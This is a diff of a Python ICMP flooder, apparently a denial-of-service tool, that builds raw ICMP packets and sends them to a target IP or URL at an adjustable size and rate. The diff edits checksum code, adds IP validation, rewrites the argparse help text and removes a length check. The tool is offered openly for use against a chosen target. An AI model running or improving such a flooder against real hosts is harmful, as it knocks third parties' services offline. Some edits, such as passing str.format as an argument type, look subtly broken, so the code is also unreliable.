@@ -7,15 +7,16 @@ import struct
 import socket
 import random
 import argparse
+import re
 
 class Flooder:
     # Check data, calculated from the ICMP header and data
     def checksum(self, msg):
-        s = 0
+        sum = 0
         for i in range(0, len(msg), 2):
             w = ord(msg[i]) + (ord(msg[i+1]) << 8)
-            s = ((s + w) & 0xffff) + ((s + w) >> 16)
-        return socket.htons(~s & 0xffff)
+            sum = ((sum + w) & 0xffff) + ((sum + w) >> 16)
+        return socket.htons(~sum & 0xffff)
 
     # Construct the header and data of packet and pack it
     def construct_packet(self, length):
@@ -27,8 +28,9 @@ class Flooder:
 
     # Create socket to send packets to specified ip address
     # Close the created socket after using
-    def create_socket(self, ip, port, length, freq):  
+    def create_socket(self, ip, port, length, freq):
         sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+        socket.inet_aton(ip)
         
         # This loop if for sending packet specified times
         #for i in range(0, 6):
@@ -46,10 +48,11 @@ class Flooder:
         sock.close()
         
     def main(self, argv):
-        parser = argparse.ArgumentParser(description="ICMP-packets flooder. This programm creates and" + 
-                " sends the ICMP-packets to target IP-address/URL address. You can change port number," +
-                " length of packet and frequence of sending.")
-        parser.add_argument('-i', help='Enter target ip address of destination', metavar='', type=str)
+        parser = argparse.ArgumentParser(prog="ICMP_Flooder", description="ICMP-packets flooder." +
+                " This programm creates and sends the ICMP-packets to target IP-address/URL" +
+                " address. You can change port number, length of packet and frequence of sending.\n",
+                epilog='Contact with me on "https://github.com/breadrock1" \n\n')
+        parser.add_argument('-i', help='Enter target ip address of destination', metavar='', type=str.format)
         parser.add_argument('-u', help='Enter target url address', metavar='', type=str)
         parser.add_argument('-p', help='Specify port number', metavar='', default=69, type=int)
         parser.add_argument('-l', help='Specify packet length', metavar='', default=60, type =int)
@@ -64,9 +67,6 @@ class Flooder:
         if args.i:
             ip_addr = args.i
             print("Specific IP-Address: ", ip_addr)
-        if len(ip_addr) < 7:
-            print("IP-Address is not correct")
-            sys.exit()
         
         # Check for correct port number to send packet      
         if int(args.p) > 0 and int(args.p) < 65530:
